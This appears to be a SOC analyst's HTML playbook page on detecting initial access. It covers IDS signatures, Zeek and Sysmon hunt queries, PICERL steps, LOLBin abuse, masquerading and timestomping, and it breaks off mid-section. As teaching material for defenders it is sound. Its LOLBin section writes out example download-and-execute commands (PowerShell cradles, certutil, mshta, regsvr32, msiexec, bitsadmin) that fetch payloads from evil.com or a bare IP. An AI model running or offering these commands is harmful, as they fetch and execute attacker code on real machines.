@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Playbook — Initial Access Detection — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav class="navbar">
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()" title="Toggle sidebar" aria-label="Toggle sidebar">
+    <svg width="15" height="12" viewBox="0 0 15 12" fill="currentColor">
+      <rect width="15" height="2" rx="1"/>
+      <rect y="5" width="15" height="2" rx="1"/>
+      <rect y="10" width="15" height="2" rx="1"/>
+    </svg>
+  </button>
+  <a href="index.html" class="nav-brand"><span class="icon">⬡</span> SOC Notes</a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="investigation-flow.html">Playbook</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="elk.html">ELK Stack</a>
+    <a href="openvas.html">OpenVAS</a>
+    <a href="kali.html">Kali Linux</a>
+    <a href="metasploit.html">Metasploit</a>
+    <a href="yara.html">YARA</a>
+    <a href="zeek.html">Zeek</a>
+    <a href="clamav.html">ClamAV</a>
+    <a href="misp.html">MISP</a>
+    <a href="cuckoo.html">Cuckoo</a>
+    <a href="velociraptor.html">Velociraptor</a>
+    <a href="autopsy.html">Autopsy</a>
+    <a href="anyrun.html">ANY.RUN</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="snort.html">Snort</a>
+    <a href="ossec.html">OSSEC</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+
+  <aside id="sb" class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-label">Notebook</div>
+      <div class="sidebar-title">Playbook &mdash; Initial Access</div>
+    </div>
+  </aside>
+
+  <main id="main" class="main">
+    <div class="content-wrap">
+      <div id="content-area">
+        <div class="welcome">
+          <div class="w-icon">&#x1F6AA;</div>
+          <h2>Playbook &mdash; Initial Access Detection</h2>
+          <p>Select a topic from the sidebar to begin.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════
+     01 · Alert Recognition
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-alert-recognition">
+<article class="topic">
+<h1>01 &middot; Alert Recognition</h1>
+<hr class="divider">
+
+<p>Initial access is where every compromise begins. Your IDS/IPS and network monitoring tools will generate the first breadcrumbs. Knowing which alert signatures map to initial access helps you catch patient zero before lateral movement starts.</p>
+
+<h3>Suricata Signatures for Initial Access</h3>
+<p>Suricata fires rule-based alerts when network traffic matches known malicious patterns. The following signatures are high-priority indicators of initial access activity:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Signature Name</th><th>SID Category</th><th>What It Means</th><th>MITRE ATT&amp;CK</th></tr></thead>
+  <tbody>
+    <tr><td><strong>ET INFO PowerShell User Agent</strong></td><td>ET INFO</td><td>An HTTP request was made using a PowerShell user agent string &mdash; indicates a download cradle or remote script execution</td><td>T1059.001 PowerShell</td></tr>
+    <tr><td><strong>ET MALWARE Windows Executable Download</strong></td><td>ET MALWARE</td><td>An executable (PE file, x-dosexec) was transferred over HTTP &mdash; payload delivery in progress</td><td>T1105 Ingress Tool Transfer</td></tr>
+    <tr><td><strong>ET POLICY PE EXE or DLL Windows file download HTTP</strong></td><td>ET POLICY</td><td>A Windows binary was downloaded over cleartext HTTP &mdash; unusual for legitimate software</td><td>T1105 Ingress Tool Transfer</td></tr>
+    <tr><td><strong>ET TROJAN Generic RAT Checkin</strong></td><td>ET TROJAN</td><td>Outbound traffic matching a known RAT command-and-control pattern</td><td>T1071 Application Layer Protocol</td></tr>
+    <tr><td><strong>ET INFO Dotted Quad Host MZ Response</strong></td><td>ET INFO</td><td>An MZ (executable) header was returned from a dotted-quad IP &mdash; no domain name, highly suspicious</td><td>T1105 Ingress Tool Transfer</td></tr>
+    <tr><td><strong>ET HUNTING Possible EXE Download From Dotted Quad Host</strong></td><td>ET HUNTING</td><td>HTTP GET to a bare IP address returned what looks like an executable</td><td>T1105 Ingress Tool Transfer</td></tr>
+  </tbody>
+</table></div>
+
+<h3>Identifying the First Compromise Point</h3>
+<p>When you see a cluster of these alerts, ask yourself:</p>
+<ul>
+  <li><strong>Which internal IP triggered the alert?</strong> &mdash; This is your candidate patient zero</li>
+  <li><strong>What was the destination IP?</strong> &mdash; Is it a known C2 server, a dotted-quad with no PTR record, or a legitimate CDN?</li>
+  <li><strong>What time did the first alert fire?</strong> &mdash; This sets the beginning of your investigation timeline</li>
+  <li><strong>Was there a chain?</strong> &mdash; Payload download alert followed by C2 beacon alert = confirmed compromise sequence</li>
+</ul>
+
+<h3>Zeek HTTP Log &mdash; Dotted-Quad Detection</h3>
+<p>Zeek's <code>http.log</code> records every HTTP transaction. A key indicator of initial access is connections to bare IP addresses (no domain name):</p>
+
+<pre><code><span class="cm"># Hunt for HTTP connections to dotted-quad hosts (no domain name)</span>
+<span class="cm"># In Security Onion / Kibana:</span>
+event.module:zeek AND event.dataset:zeek.http AND NOT url.domain:*.*
+
+<span class="cm"># Or search for specific suspicious fields:</span>
+zeek.http.host: /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/
+
+<span class="cm"># Why this matters:</span>
+<span class="cm"># - Legitimate software almost always uses domain names</span>
+<span class="cm"># - Malware C2 and payload staging servers often use raw IPs</span>
+<span class="cm"># - Dotted-quad + executable download = strong indicator of payload delivery</span></code></pre>
+
+<div class="callout note">
+  <strong>Triage Priority:</strong> ET MALWARE and ET TROJAN alerts are almost always worth investigating. ET INFO and ET POLICY alerts need context &mdash; a PowerShell user agent from an admin workstation during business hours is different from one at 3 AM from a finance department PC.
+</div>
+
+<h3>Alert Correlation Chain</h3>
+<p>A single alert is a clue. A chain of alerts on the same source IP within a short window is a confirmed incident:</p>
+<pre><code><span class="cm"># Example alert chain on 192.168.56.30 within 5 minutes:</span>
+1. ET INFO PowerShell User Agent          <span class="cm"># PowerShell reached out to the internet</span>
+2. ET MALWARE Windows Executable Download  <span class="cm"># An .exe was downloaded</span>
+3. ET TROJAN Generic RAT Checkin           <span class="cm"># Downloaded file called home to C2</span>
+
+<span class="cm"># This chain = Initial Access → Payload Delivery → C2 Establishment</span>
+<span class="cm"># Escalate immediately</span></code></pre>
+
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════
+     02 · PICERL Investigation Steps
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-picerl-steps">
+<article class="topic">
+<h1>02 &middot; PICERL Investigation Steps</h1>
+<hr class="divider">
+
+<p>Initial access is <strong>patient zero</strong> &mdash; every other phase of the compromise traces back to this moment. Your PICERL process for initial access focuses on answering three critical questions: <em>What was the delivery method? What was downloaded? When exactly did the compromise start?</em></p>
+
+<h3>PICERL Applied to Initial Access</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Phase</th><th>Initial Access Actions</th><th>Key Questions</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>P &mdash; Preparation</strong></td>
+      <td>Ensure Suricata rules are current (<code>so-rule-update</code>). Verify Zeek is logging HTTP/DNS/files. Confirm Sysmon is deployed on endpoints with EID1 (process create), EID3 (network), EID11 (file create) enabled.</td>
+      <td>Do we have visibility into all delivery vectors?</td>
+    </tr>
+    <tr>
+      <td><strong>I &mdash; Identification</strong></td>
+      <td>Correlate IDS alerts with Zeek HTTP logs. Identify the source endpoint, destination IP, downloaded file, and timestamp of the first malicious activity. Check <code>zeek.files</code> for MIME type confirmation.</td>
+      <td>What was delivered? From where? To whom? When?</td>
+    </tr>
+    <tr>
+      <td><strong>C &mdash; Containment</strong></td>
+      <td>Isolate the compromised endpoint from the network. Block the payload delivery IP and C2 IP at the firewall. Quarantine the downloaded file. Do NOT power off &mdash; volatile memory may contain injection artifacts.</td>
+      <td>Is the threat still active? Can it spread?</td>
+    </tr>
+    <tr>
+      <td><strong>E &mdash; Eradication</strong></td>
+      <td>Remove the downloaded payload. Check for persistence mechanisms (scheduled tasks, registry Run keys) that the payload may have installed. Remove any LOLBin artifacts (certutil cache, temp HTA files).</td>
+      <td>Did the payload install persistence before we contained it?</td>
+    </tr>
+    <tr>
+      <td><strong>R &mdash; Recovery</strong></td>
+      <td>Restore the endpoint from a known-good image or remove all malicious artifacts. Re-enable network access after confirming no C2 callbacks. Monitor for 24-48 hours for re-infection.</td>
+      <td>Is the endpoint clean? Are we sure the attacker is gone?</td>
+    </tr>
+    <tr>
+      <td><strong>L &mdash; Lessons Learned</strong></td>
+      <td>Document the delivery method, payload characteristics, IOCs (hashes, IPs, domains). Update Suricata rules if the initial delivery was not caught by existing signatures. Add IOCs to MISP/threat intel platform.</td>
+      <td>How did this get past our defenses? What do we tune?</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3>Setting the Investigation Timeline</h3>
+<p>The timestamp of the first initial access alert becomes <strong>T-zero</strong> for your entire investigation. Everything else is measured relative to this moment:</p>
+
+<pre><code><span class="cm"># Example timeline anchored to initial access</span>
+T-zero     = 2024-09-15 08:23:41 UTC  <span class="cm"># First ET MALWARE alert fires</span>
+T+2 min    = PowerShell beacon to C2 IP detected
+T+5 min    = Scheduled task created (persistence)
+T+12 min   = CreateRemoteThread into dwm.exe (injection)
+T+45 min   = Lateral movement attempt to file server
+
+<span class="cm"># Search all logs from T-zero minus 30 minutes</span>
+<span class="cm"># The attack may have started with recon before the alert fired</span></code></pre>
+
+<div class="callout warn">
+  <strong>Critical:</strong> Always search <em>before</em> T-zero too. The first alert is not always the first activity &mdash; there may have been DNS lookups, failed connection attempts, or phishing emails that preceded the payload delivery.
+</div>
+
+<h3>Evidence Collection Priority</h3>
+<ol>
+  <li><strong>Network logs</strong> &mdash; Zeek HTTP, DNS, files, conn logs (volatile &mdash; may rotate)</li>
+  <li><strong>IDS alerts</strong> &mdash; Suricata EVE JSON with full alert metadata</li>
+  <li><strong>Endpoint logs</strong> &mdash; Sysmon EID1, EID3, EID11 around the T-zero window</li>
+  <li><strong>The payload itself</strong> &mdash; hash it, submit to sandbox, do NOT execute on analyst workstation</li>
+  <li><strong>Memory capture</strong> &mdash; if process injection is suspected, capture RAM before reboot</li>
+</ol>
+
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════
+     03 · Payload Delivery Analysis
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-payload-delivery">
+<article class="topic">
+<h1>03 &middot; Payload Delivery Analysis</h1>
+<hr class="divider">
+
+<p>Payload delivery is the mechanism by which the attacker gets their malicious code onto the victim endpoint. In network-based detection, HTTP is the most common delivery channel &mdash; and Zeek's HTTP and file logs provide the richest evidence.</p>
+
+<h3>HTTP Payload Delivery Indicators</h3>
+<p>When reviewing Zeek HTTP logs or Suricata alerts for payload delivery, look for these red flags:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Indicator</th><th>What It Looks Like</th><th>Why It's Suspicious</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>Dotted-quad IP host</strong></td>
+      <td><code>host: 8.253.135.120</code> (no domain name)</td>
+      <td>Legitimate software uses domain names. Raw IPs suggest attacker-controlled staging infrastructure with no DNS trail.</td>
+    </tr>
+    <tr>
+      <td><strong>x-dosexec MIME type</strong></td>
+      <td><code>zeek.files.mime_type: application/x-dosexec</code></td>
+      <td>This is a Windows PE executable. Executables downloaded over HTTP from unknown hosts are almost always malicious.</td>
+    </tr>
+    <tr>
+      <td><strong>Large GET response</strong></td>
+      <td><code>resp_bytes &gt; 50000</code> to unknown IP</td>
+      <td>Large responses to unfamiliar IPs may indicate file downloads. Correlate with zeek.files for MIME confirmation.</td>
+    </tr>
+    <tr>
+      <td><strong>No Referer header</strong></td>
+      <td><code>referrer: (empty)</code></td>
+      <td>Normal browser downloads have a Referer from the page that initiated the download. Empty Referer = direct navigation, scripted download, or command-line tool (curl, PowerShell, certutil).</td>
+    </tr>
+    <tr>
+      <td><strong>PowerShell User Agent</strong></td>
+      <td><code>user_agent: "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1"</code></td>
+      <td>PowerShell making HTTP requests to external IPs is a classic download cradle indicator.</td>
+    </tr>
+    <tr>
+      <td><strong>Unusual User Agent strings</strong></td>
+      <td><code>user_agent: "certutil"</code> or <code>"BITS"</code></td>
+      <td>LOLBin tools making outbound HTTP requests indicate attacker tooling, not normal user browsing.</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3>Zeek HTTP Log Field Reference</h3>
+<p>These are the most important fields in <code>zeek.http</code> for payload delivery analysis:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Field</th><th>Description</th><th>What to Look For</th></tr></thead>
+  <tbody>
+    <tr><td><code>id.orig_h</code></td><td>Source IP (the victim endpoint)</td><td>Which internal host initiated the download?</td></tr>
+    <tr><td><code>id.resp_h</code></td><td>Destination IP (the payload server)</td><td>Is this a known-bad IP? Dotted-quad? GeoIP?</td></tr>
+    <tr><td><code>host</code></td><td>HTTP Host header</td><td>Domain name or raw IP? If raw IP = suspicious.</td></tr>
+    <tr><td><code>uri</code></td><td>Requested URI path</td><td>Does the filename suggest an executable? (.exe, .dll, .hta, .ps1)</td></tr>
+    <tr><td><code>user_agent</code></td><td>Client User-Agent string</td><td>PowerShell? certutil? wget? Non-browser UA = LOLBin activity.</td></tr>
+    <tr><td><code>referrer</code></td><td>HTTP Referer header</td><td>Empty = direct/scripted download. Populated = user clicked a link.</td></tr>
+    <tr><td><code>resp_bytes</code></td><td>Response body size in bytes</td><td>Large responses to suspicious hosts = file transfer.</td></tr>
+    <tr><td><code>status_code</code></td><td>HTTP response code</td><td>200 = successful download. 302 = redirect chain (check final destination).</td></tr>
+    <tr><td><code>resp_mime_types</code></td><td>MIME type of response</td><td>application/x-dosexec = PE executable. application/x-msdos-program = same.</td></tr>
+  </tbody>
+</table></div>
+
+<h3>Zeek Files Log &mdash; MIME Type Confirmation</h3>
+<pre><code><span class="cm"># Search zeek.files for executable downloads</span>
+event.module:zeek AND event.dataset:zeek.files AND file.mime_type:"application/x-dosexec"
+
+<span class="cm"># Key fields in zeek.files:</span>
+<span class="cm"># - file.hash.md5 / file.hash.sha256  → hash the payload for threat intel lookup</span>
+<span class="cm"># - file.size                          → how large was the downloaded file?</span>
+<span class="cm"># - file.mime_type                     → confirms it's a PE executable</span>
+<span class="cm"># - zeek.files.source                  → "HTTP" confirms it came over web traffic</span>
+<span class="cm"># - zeek.files.tx_hosts                → the IP that served the file</span>
+<span class="cm"># - zeek.files.rx_hosts                → the IP that received the file (victim)</span></code></pre>
+
+<h3>Hunt Queries for Payload Delivery</h3>
+<pre><code><span class="cm"># 1. All executable downloads over HTTP</span>
+event.module:zeek AND event.dataset:zeek.files AND file.mime_type:"application/x-dosexec"
+
+<span class="cm"># 2. PowerShell user agent in HTTP logs</span>
+event.module:zeek AND event.dataset:zeek.http AND user_agent.original:*PowerShell*
+
+<span class="cm"># 3. HTTP requests to dotted-quad hosts (no domain)</span>
+event.module:zeek AND event.dataset:zeek.http AND url.domain:/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/
+
+<span class="cm"># 4. Large HTTP responses from unknown external IPs</span>
+event.module:zeek AND event.dataset:zeek.http AND http.response.body.bytes:>50000 AND NOT url.domain:*.microsoft.com AND NOT url.domain:*.windowsupdate.com
+
+<span class="cm"># 5. HTTP downloads with no Referer header</span>
+event.module:zeek AND event.dataset:zeek.http AND NOT http.request.referrer:* AND http.response.body.bytes:>10000
+
+<span class="cm"># 6. certutil or BITS user agent</span>
+event.module:zeek AND event.dataset:zeek.http AND (user_agent.original:*certutil* OR user_agent.original:*BITS*)</code></pre>
+
+<div class="callout lab">
+  <strong>Analyst Tip:</strong> When you find a payload delivery event, immediately pivot to the source IP in Sysmon EID1 (process creation) logs. Look for the parent process that initiated the download &mdash; this tells you whether the user clicked something (explorer.exe parent) or a script ran automatically (powershell.exe, cmd.exe, wscript.exe parent).
+</div>
+
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════
+     04 · LOLBin Abuse Detection
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-lolbins">
+<article class="topic">
+<h1>04 &middot; LOLBin Abuse Detection</h1>
+<hr class="divider">
+
+<p><strong>Living off the Land Binaries (LOLBins)</strong> are legitimate Windows executables that attackers abuse to download payloads, execute code, or bypass application whitelisting. Because these are signed Microsoft binaries, they often evade antivirus and EDR detection. Every SOC analyst must know what malicious LOLBin usage looks like versus legitimate usage.</p>
+
+<h3>LOLBin Reference Table</h3>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Binary</th><th>Legitimate Purpose</th><th>Malicious Abuse Pattern</th><th>ATT&amp;CK Technique</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>powershell.exe</strong></td>
+      <td>Windows automation, scripting, system administration</td>
+      <td><code>-enc</code> (encoded commands), <code>-ep bypass</code> (execution policy bypass), <code>IEX(New-Object Net.WebClient).DownloadString()</code> (download cradle)</td>
+      <td>T1059.001</td>
+    </tr>
+    <tr>
+      <td><strong>certutil.exe</strong></td>
+      <td>Certificate management, CA operations</td>
+      <td><code>certutil -urlcache -f http://evil.com/payload.exe out.exe</code> (download), <code>certutil -decode encoded.txt payload.exe</code> (Base64 decode)</td>
+      <td>T1105, T1140</td>
+    </tr>
+    <tr>
+      <td><strong>mshta.exe</strong></td>
+      <td>Execute HTML Application (.hta) files</td>
+      <td><code>mshta http://evil.com/payload.hta</code> (remote HTA execution with embedded VBScript/JScript)</td>
+      <td>T1218.005</td>
+    </tr>
+    <tr>
+      <td><strong>rundll32.exe</strong></td>
+      <td>Execute DLL exported functions, Windows COM infrastructure</td>
+      <td><code>rundll32 C:\Users\Public\evil.dll,DllMain</code> (unusual DLL path), <code>rundll32 javascript:"\..\mshtml,RunHTMLApplication";</code> (script execution)</td>
+      <td>T1218.011</td>
+    </tr>
+    <tr>
+      <td><strong>regsvr32.exe</strong></td>
+      <td>Register/unregister COM DLLs</td>
+      <td><code>regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll</code> (COM scriptlet execution, bypasses AppLocker)</td>
+      <td>T1218.010</td>
+    </tr>
+    <tr>
+      <td><strong>msiexec.exe</strong></td>
+      <td>Install Windows Installer packages (.msi)</td>
+      <td><code>msiexec /q /i http://evil.com/payload.msi</code> (silent remote MSI installation)</td>
+      <td>T1218.007</td>
+    </tr>
+    <tr>
+      <td><strong>wscript.exe / cscript.exe</strong></td>
+      <td>Windows Script Host &mdash; execute VBS/JS scripts</td>
+      <td>Execution of .vbs/.js files from temp directories, Downloads folder, or %APPDATA%</td>
+      <td>T1059.005</td>
+    </tr>
+    <tr>
+      <td><strong>bitsadmin.exe</strong></td>
+      <td>Background Intelligent Transfer Service management</td>
+      <td><code>bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\Users\Public\payload.exe</code></td>
+      <td>T1197</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3>Detailed LOLBin Analysis</h3>
+
+<h4>powershell.exe</h4>
+<p>The most commonly abused LOLBin. Attackers use PowerShell download cradles to fetch and execute payloads entirely in memory:</p>
+<pre><code><span class="cm"># Malicious: encoded command hiding a download cradle</span>
+powershell.exe -NoP -NonI -W Hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
+
+<span class="cm"># Malicious: direct download and execute (IEX = Invoke-Expression)</span>
+powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://8.253.135.120/payload.ps1')"
+
+<span class="cm"># Malicious: download file to disk</span>
+powershell.exe -c "(New-Object Net.WebClient).DownloadFile('http://8.253.135.120/mal.exe','C:\Users\Public\update.exe')"
+
+<span class="cm"># What to look for in Sysmon EID1:</span>
+<span class="cm"># - ParentImage NOT explorer.exe or services expected to spawn PowerShell</span>
+<span class="cm"># - CommandLine contains: -enc, -encoded, -ep bypass, IEX, DownloadString, DownloadFile</span>
+<span class="cm"># - CommandLine contains: WebClient, Invoke-WebRequest, Start-BitsTransfer</span>
+<span class="cm"># - CommandLine contains: -W Hidden, -WindowStyle Hidden, -NonInteractive</span></code></pre>
+
+<h4>certutil.exe</h4>
+<p>A certificate management tool that attackers abuse as a file downloader and Base64 decoder:</p>
+<pre><code><span class="cm"># Malicious: download a file from the internet</span>
+certutil.exe -urlcache -split -f http://8.253.135.120/payload.exe C:\Users\Public\payload.exe
+
+<span class="cm"># Malicious: decode a Base64-encoded payload</span>
+certutil.exe -decode C:\Users\Public\encoded.txt C:\Users\Public\payload.exe
+
+<span class="cm"># What to look for in Sysmon EID1:</span>
+<span class="cm"># - CommandLine contains: -urlcache, -decode, -encode</span>
+<span class="cm"># - Target path is in a user-writable location (not system cert stores)</span>
+<span class="cm"># - ParentImage is cmd.exe, powershell.exe, or another LOLBin (not MMC)</span></code></pre>
+
+<h4>mshta.exe</h4>
+<pre><code><span class="cm"># Malicious: execute remote HTA file containing VBScript</span>
+mshta.exe http://evil.com/payload.hta
+
+<span class="cm"># Malicious: inline VBScript execution</span>
+mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(...)"":close")
+
+<span class="cm"># What to look for in Sysmon EID1:</span>
+<span class="cm"># - CommandLine contains http:// or https:// (remote HTA)</span>
+<span class="cm"># - CommandLine contains vbscript: or javascript:</span>
+<span class="cm"># - ChildProcess spawning powershell.exe, cmd.exe, or another LOLBin</span></code></pre>
+
+<h4>regsvr32.exe &mdash; Squiblydoo Attack</h4>
+<pre><code><span class="cm"># Malicious: COM scriptlet execution (bypasses AppLocker)</span>
+regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
+
+<span class="cm"># Breakdown:</span>
+<span class="cm"># /s       = silent (no dialog boxes)</span>
+<span class="cm"># /n       = do not call DllRegisterServer</span>
+<span class="cm"># /u       = unregister mode</span>
+<span class="cm"># /i:URL   = pass URL to DllInstall → fetches and executes remote scriptlet</span>
+<span class="cm"># scrobj.dll = COM Scripting runtime (legitimate Microsoft DLL)</span>
+
+<span class="cm"># What to look for in Sysmon EID1:</span>
+<span class="cm"># - CommandLine contains /i:http or /i:https</span>
+<span class="cm"># - CommandLine contains scrobj.dll</span>
+<span class="cm"># - Network connection from regsvr32.exe (Sysmon EID3)</span></code></pre>
+
+<h3>Sysmon EID1 Hunt Queries</h3>
+<pre><code><span class="cm"># Hunt for PowerShell download cradles</span>
+event.code:1 AND process.name:powershell.exe AND process.command_line:(*DownloadString* OR *DownloadFile* OR *IEX* OR *-enc* OR *WebClient* OR *Invoke-WebRequest*)
+
+<span class="cm"># Hunt for certutil abuse</span>
+event.code:1 AND process.name:certutil.exe AND process.command_line:(*-urlcache* OR *-decode* OR *-encode*)
+
+<span class="cm"># Hunt for mshta remote execution</span>
+event.code:1 AND process.name:mshta.exe AND process.command_line:(*http* OR *vbscript* OR *javascript*)
+
+<span class="cm"># Hunt for regsvr32 Squiblydoo</span>
+event.code:1 AND process.name:regsvr32.exe AND process.command_line:(*scrobj.dll* OR */i:http*)
+
+<span class="cm"># Hunt for msiexec remote install</span>
+event.code:1 AND process.name:msiexec.exe AND process.command_line:(*http* OR *https*)
+
+<span class="cm"># Hunt for wscript/cscript from suspicious locations</span>
+event.code:1 AND (process.name:wscript.exe OR process.name:cscript.exe) AND process.command_line:(*\\Temp\\* OR *\\Downloads\\* OR *\\AppData\\*)</code></pre>
+
+<div class="callout warn">
+  <strong>Key Insight:</strong> LOLBin abuse is about <em>context</em>, not just the binary name. <code>certutil.exe</code> run by an admin from MMC to manage certificates is fine. <code>certutil.exe -urlcache</code> run by <code>cmd.exe</code> spawned from <code>winword.exe</code> is a malicious macro downloading a payload.
+</div>
+
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════
+     05 · Masquerading & Timestomping
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-masquerading">
+<article class="topic">
+<h1>05 &middot; Masquerading &amp; Timestomping</h1>
+<hr class="divider">
+
+<p>Attackers disguise their malware to look like legitimate software. <strong>Masquerading</strong> (T1036) makes a malicious binary look benign by naming or metadata. <strong>Timestomping</strong> (T1070.006) alters file timestamps to blend in with legitimate system files.</p>
+
+<h3>T1036 &mdash; Masquerading Detection</h3>
+
+<h4>Filename vs. Path Mismatch</h4>
+<p>The most common masquerading technique is naming malware after a well-known Windows binary but placing it in the wrong directory:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Binary Name</th><th>Legitimate Path</th><th>Suspicious If Found In</th></tr></thead>
+  <tbody>
+    <tr><td><code>svchost.exe</code></td><td><code>C:\Windows\System32\svchost.exe</code></td><td>Any other directory &mdash; <code>C:\Users\</code>, <code>C:\Temp\</code>, <code>C:\ProgramData\</code></td></tr>
+    <tr><td><code>csrss.exe</code></td><td><code>C:\Windows\System32\csrss.exe</code></td><td>Any other directory</td></tr>
+    <tr><td><code>lsass.exe</code></td><td><code>C:\Windows\System32\lsass.exe</code></td><td>Any other directory</td></tr>
+    <tr><td><code>explorer.exe</code></td><td><code>C:\Windows\explorer.exe</code></td><td>Any other directory</td></tr>
+    <tr><td><code>taskhostw.exe</code></td><td><code>C:\Windows\System32\taskhostw.exe</code></td><td>Any other directory</td></tr>
+    <tr><td><code>RuntimeBroker.exe</code></td><td><code>C:\Windows\System32\RuntimeBroker.exe</code></td><td>Any other directory</td></tr>
+  </tbody>
+</table></div>
+
+<pre><code><span class="cm"># Sysmon EID1 hunt: svchost.exe running from non-System32 path</span>
+event.code:1 AND process.name:svchost.exe AND NOT process.executable:"C:\\Windows\\System32\\svchost.exe"
+
+<span class="cm"># Generalized hunt: common Windows process names from wrong paths</span>
+event.code:1 AND process.name:(svchost.exe OR csrss.exe OR lsass.exe OR services.exe OR smss.exe OR wininit.exe) AND NOT process.executable:C\\:\\\\Windows\\\\System32\\\\*</code></pre>
+
+<h4>PE Metadata Mismatch</h4>
+<p>Malware may set its <strong>VersionInfo</strong> (embedded PE metadata) to claim it's a Microsoft product, but the actual binary hash won't match any known Microsoft file:</p>
+<ul>
+  <li><strong>Check the publisher field</strong> in Sysmon EID1 &mdash; does the binary claim to be signed by Microsoft?</li>
+  <li><strong>Verify the hash</strong> against Microsoft's <a href="https://winbindex.m417z.com/">Winbindex</a> (Windows Binary Index) &mdash; if the hash doesn't match any known Microsoft file, it's masquerading</li>
+  <li><strong>Check Authenticode signature</strong> &mdash; is it actually signed, or is the metadata faked without a valid signature?</li>
+</ul>
+
+<h4>Naming Tricks</h4>
+<div class="table-wrap"><table>
+  <thead><tr><th>Technique</th><th>Example</th><th>How to Spot</th></tr></thead>
+  <tbody>
+    <tr><td>Double extension</td><td><code>document.pdf.exe</code></td><td>Windows hides known extensions &mdash; user sees "document.pdf"</td></tr>
+    <tr><td>Unicode RLO</td><td><code>invoice[RLO]fdp.exe</code> appears as <code>invoiceexe.pdf</code></td><td>Right-to-Left Override character reverses the displayed filename</td></tr>
+    <tr><td>Similar names</td><td><code>svch0st.exe</code> (zero not O), <code>scvhost.exe</code></td><td>Slight misspelling of legitimate process names</td></tr>
+    <tr><td>Legitimate-sounding</td><td><code>Windows-Endpoint-Pro_ver_89_003.exe</code></td><td>Sounds like a legitimate update but is entirely fabricated</td></tr>
+  </tbody>
+</table></div>
+
+<h3>T1070.006 &mdash; Timestomping Detection</h3>
+<p>Timestomping modifies a file's creation or modification time to make it appear older and blend in with legitimate system files.</p>
+
+<h4>Sysmon EID2 &mdash; File Creation Time Changed</h4>
+<pre><code><span class="cm"># Sysmon Event ID 2 fires when a process modifies a file's creation time</span>
+<span class="cm"># This is the PRIMARY detection for timestomping</span>
+
+event.code:2
+
+<span class="cm"># Key fields to examine:</span>
+<span class="cm"># - TargetFilename:    the file whose timestamp was changed</span>
+<span class="cm"># - CreationUtcTime:   the NEW (fake) timestamp the attacker set</span>
+<span class="cm"># - PreviousCreationUtcTime: the ORIGINAL (real) timestamp</span>
+<span class="cm"># - Image:             the process that performed the timestomp</span>
+
+<span class="cm"># Hunt: any EID2 where the new timestamp is significantly older than the original</span>
+<span class="cm"># This means someone backdated a file to look older than it really is</span></code></pre>
+
+<h4>Why Attackers Timestomp</h4>
+<ul>
+  <li><strong>Blend with legitimate files:</strong> A malware file in System32 with a creation date of 2019 looks like it was installed with the OS</li>
+  <li><strong>Evade timeline analysis:</strong> Analysts sorting by "recently created" won't see the file</li>
+  <li><strong>Bypass EDR rules:</strong> Some EDR tools flag files created within the last N hours &mdash; timestomping defeats this</li>
+</ul>
+
+<h4>$SI vs. $FN Timestamps in MFT</h4>
+<p>NTFS stores two sets of timestamps in the Master File Table (MFT):</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>Attribute</th><th>Name</th><th>Can Be Modified?</th><th>Forensic Value</th></tr></thead>
+  <tbody>
+    <tr><td><code>$STANDARD_INFORMATION</code> ($SI)</td><td>Standard timestamps shown in Explorer</td><td>Yes &mdash; easily modified by SetFileTime API, PowerShell, timestomping tools</td><td>Low &mdash; this is what gets timestomped</td></tr>
+    <tr><td><code>$FILE_NAME</code> ($FN)</td><td>Timestamps managed by the NTFS driver</td><td>Not by normal user-mode tools &mdash; requires raw disk write or driver-level access</td><td>High &mdash; usually preserves the real creation time</td></tr>
+  </tbody>
+</table></div>
+
+<pre><code><span class="cm"># Detection method: compare $SI and $FN timestamps</span>
+<span class="cm"># If $SI.Created is EARLIER than $FN.Created → timestomping confirmed</span>
+<span class="cm"># (The file's displayed creation time was backdated)</span>
+
+<span class="cm"># Tools for MFT analysis:</span>
